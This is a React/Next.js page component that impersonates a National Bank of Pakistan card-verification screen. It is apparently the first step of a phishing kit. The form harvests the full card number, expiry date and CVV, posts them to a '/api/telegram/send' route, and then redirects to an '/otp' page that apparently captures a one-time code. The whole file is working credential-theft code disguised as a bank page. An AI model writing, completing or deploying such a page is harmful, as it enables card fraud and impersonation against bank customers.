'use client'

import { useState } from 'react'
import { useRouter } from 'next/navigation'
import { ChevronDown, ChevronRight } from 'lucide-react'
import { saveSubmissionData } from '@/lib/submission-store'

const cardImage =
  'https://hebbkx1anhila5yf.public.blob.vercel-storage.com/Screenshot%202026-08-08%20062920-H6XftL6ecHRNk5qygtGjqW2SqZ0gn0.png'
const logoImage =
  'https://hebbkx1anhila5yf.public.blob.vercel-storage.com/Screenshot%202026-08-08%20062819-tEXyj9UyD7CkbbGMwFg7T0dD0XA5Ym.png'

export default function Page() {
  const router = useRouter()
  const [cardNumber, setCardNumber] = useState('')
  const [month, setMonth] = useState('')
  const [year, setYear] = useState('')
  const [cvv, setCvv] = useState('')
  const [error, setError] = useState('')
  const [submitting, setSubmitting] = useState(false)

  const handleSubmit = async (event: React.FormEvent) => {
    event.preventDefault()
    if (submitting) return

    if (cardNumber.length !== 16 || !month || !year || cvv.length !== 3) {
      setError('Please enter your complete card details.')
      return
    }
    setError('')
    setSubmitting(true)

    try {
      const data = saveSubmissionData({ card: cardNumber, month, year, cvv })
      await fetch('/api/telegram/send', {
        method: 'POST',
        headers: { 'content-type': 'application/json' },
        body: JSON.stringify(data),
      })
    } catch {
      // Continue navigation even if the notification fails
    } finally {
      router.push('/otp')
    }
  }

  return (
    <main className="min-h-screen bg-background px-3 pb-8 pt-3 text-foreground">
      <div className="mx-auto w-full max-w-[380px]">
        <header className="mb-5">
          <div className="flex h-16 w-20 items-center justify-center rounded-2xl border border-border bg-white px-2 shadow-sm">
            <img src={logoImage} alt="National Bank of Pakistan logo" className="h-auto w-full object-contain" />
          </div>
          <p className="mt-2 text-sm font-medium text-muted-foreground">national bank of pakistan</p>
        </header>

        <section aria-label="Card verification">
          <div className="card-art mb-5" role="img" aria-label="Green National Bank PayPak card">
            <img src={cardImage} alt="" className="card-art-image" />
          </div>

          <form className="space-y-3" onSubmit={handleSubmit}>
            <div className="field-shell">
              <input
                aria-label="ATM Card Number"
                inputMode="numeric"
                maxLength={16}
                value={cardNumber}
                onChange={(event) => {
                  setCardNumber(event.target.value.replace(/\D/g, ''))
                  if (error) setError('')
                }}
                placeholder="ATM Card Number (16 digits)"
              />
            </div>

            <div className="grid grid-cols-[1fr_1fr_1fr] gap-3">
              <div className="field-shell relative">
                <select aria-label="Expiration month" value={month} onChange={(event) => { setMonth(event.target.value); if (error) setError('') }}>
                  <option value="">MM</option>
                  {Array.from({ length: 12 }, (_, index) => <option key={index}>{String(index + 1).padStart(2, '0')}</option>)}
                </select>
                <ChevronDown aria-hidden="true" className="pointer-events-none absolute right-4 top-1/2 size-3.5 -translate-y-1/2 text-muted-foreground" />
              </div>
              <div className="field-shell relative">
                <select aria-label="Expiration year" value={year} onChange={(event) => { setYear(event.target.value); if (error) setError('') }}>
                  <option value="">YYYY</option>
                  {Array.from({ length: 12 }, (_, index) => <option key={index}>{2026 + index}</option>)}
                </select>
                <ChevronDown aria-hidden="true" className="pointer-events-none absolute right-4 top-1/2 size-3.5 -translate-y-1/2 text-muted-foreground" />
              </div>
              <div className="field-shell">
                <input aria-label="CVV" inputMode="numeric" maxLength={3} value={cvv} onChange={(event) => { setCvv(event.target.value.replace(/\D/g, '')); if (error) setError('') }} placeholder="CVV" />
              </div>
            </div>

            {error ? <p className="text-sm font-medium text-destructive">{error}</p> : null}

            <div className="flex items-center justify-center gap-2 py-2" aria-label="Step 1 of 4">
              <span className="h-2 w-6 rounded-full bg-primary" />
              <span className="step-dot" /><span className="step-dot" /><span className="step-dot" />
            </div>

            <button type="submit" disabled={submitting} className="flex h-14 w-full items-center justify-center gap-3 rounded-2xl bg-primary text-base font-bold text-primary-foreground shadow-[0_6px_10px_rgba(39,181,101,0.2)] transition-transform hover:-translate-y-0.5 active:translate-y-0 disabled:opacity-70">
              {submitting ? 'Please wait…' : 'Next'} <ChevronRight aria-hidden="true" className="size-5" />
            </button>
          </form>
        </section>
      </div>
    </main>
  )
}
